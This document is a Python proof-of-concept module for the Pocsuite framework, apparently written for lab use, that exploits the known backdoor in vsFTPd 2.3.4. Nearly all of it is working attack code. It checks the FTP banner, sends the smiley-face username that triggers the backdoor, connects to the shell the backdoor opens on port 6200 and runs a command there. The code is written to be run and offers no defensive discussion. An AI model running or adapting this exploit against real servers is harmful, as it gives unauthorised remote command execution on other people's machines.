# coding=utf-8
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import socket
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
target = '172.31.50.177'
port = 21


class TestPOC(POCBase):
    vulID = '71851'
    version = '1.0'
    author = 'Antiy'
    vulDate = '2014-07-01'
    createDate = '2022-10-28'
    updateDate = '2022-10-28'
    references = ['OSVDB (73573)', 'http://pastebin.com/AetT9sS5', 'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html']
    name = 'vsFTPd 2.3.4 BackDoor'
    appPowerLink = 'http://vsftpd.beasts.org/'
    appName = 'vsFTPd'
    appVersion = '2.3.4'
    vulType = 'RCE'
    desc = 'This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.'
    samples = ['']
    defaultPorts = [21]
    defaultService = ['vsftpd 2.3.4', 'vsftpd', 'ftp']

    def parse_target(self, target, default_port):
        schema = 'http'
        port = default_port
        address = ''
        if '://' in target:
            slices = target.split('://')
            schema = slices[0]
            target = slices[1]
        if ':' in target:
            slices = target.split(':')
            address = slices[0]
            port = slices[1]
        else:
            address = target
        return {'schema': schema, 'address': address, 'port': int(port)}

    def _attack(self):
        return self._verify()

    def _verify(self):
        result = {}
        try:
            target = self.parse_target(self.target, 21)
            target_ip = target['address']
            target_port = target['port']

            data = self.hack(target_ip, target_port)
            if data:
                result['VerifyInfo'] = data
                result['VerifyInfo']['URL'] = '%s:%i Backdoor Command Execution' % (target_ip, target_port)
        except Exception as e:
            print e
            result = {}

        return self.parse_output(result)

    def hack(self, target, port):
        result = {}
        # active vuln
        exploit_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            exploit_socket.connect((target, int(port)))
        except Exception:
            print "Can not attack target"
            return False

        result['Banner'] = exploit_socket.recv(1024)
        if "vsFTPd 2.3.4" in result['Banner']:
            exploit_socket.send("USER hello:)\n")
            result['Prompt'] = exploit_socket.recv(1024).strip()
            exploit_socket.send("PASS HELLO\n")
            exploit_socket.close()
        else:
            print "[!]FTP service is not vsFTPd 2.3.4"
            return False

        # shell
        shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            shell_socket.connect((target, 6200))
            shell_socket.settimeout(3)
            shell_socket.send('uptime' + '\n')
            result['Command'] = 'uptime'
            result['CommandResult'] = shell_socket.recv(1024).strip()
        except Exception as e:
            print "[!]Can not connect Shell, info: %s" % e
            return False
        print "[+]The connection shell is complete"
        return result

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('失败')
        return output


register(TestPOC)
